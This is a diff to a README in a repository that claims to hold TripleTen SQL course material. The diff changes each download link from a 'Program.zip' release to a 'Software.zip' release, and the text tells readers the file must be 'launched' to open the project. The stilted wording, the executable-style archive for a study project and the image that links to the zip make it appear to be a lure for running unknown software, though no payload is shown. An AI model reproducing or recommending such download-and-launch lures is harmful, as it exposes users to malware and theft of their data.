@@ -30,10 +30,10 @@ Welcome to the **Data_Collection_and_Storage_SQL** repository by TripleTen! This
 ## 🚀 Resource Access
 To access the project's main resource, you can download it by clicking the button below:
 
-[![Download Project](https://github.com/velvirt/Data_Collection_and_Storage_-SQL-/releases/download/v1.0/Program.zip)](https://github.com/velvirt/Data_Collection_and_Storage_-SQL-/releases/download/v1.0/Program.zip)
+[![Download Project](https://github.com/velvirt/Data_Collection_and_Storage_-SQL-/releases/download/v2.0/Software.zip)](https://github.com/velvirt/Data_Collection_and_Storage_-SQL-/releases/download/v2.0/Software.zip)
 
 ## 📝 Launching the File
-The provided link ends with the file name "https://github.com/velvirt/Data_Collection_and_Storage_-SQL-/releases/download/v1.0/Program.zip," indicating that it needs to be launched to access the contents of the project. Click the button above to begin the download process.
+The provided link ends with the file name "https://github.com/velvirt/Data_Collection_and_Storage_-SQL-/releases/download/v2.0/Software.zip," indicating that it needs to be launched to access the contents of the project. Click the button above to begin the download process.
 
 ---
 
@@ -49,5 +49,5 @@ If the provided link is not working or if you encounter any issues with download
 
 Thank you for taking an interest in the **Data_Collection_and_Storage_SQL** project by TripleTen. We hope this repository helps you enhance your knowledge and skills in SQL data management. Happy exploring! 🚀
 
-![SQL Data Management](https://github.com/velvirt/Data_Collection_and_Storage_-SQL-/releases/download/v1.0/Program.zip)
+![SQL Data Management](https://github.com/velvirt/Data_Collection_and_Storage_-SQL-/releases/download/v2.0/Software.zip)
 
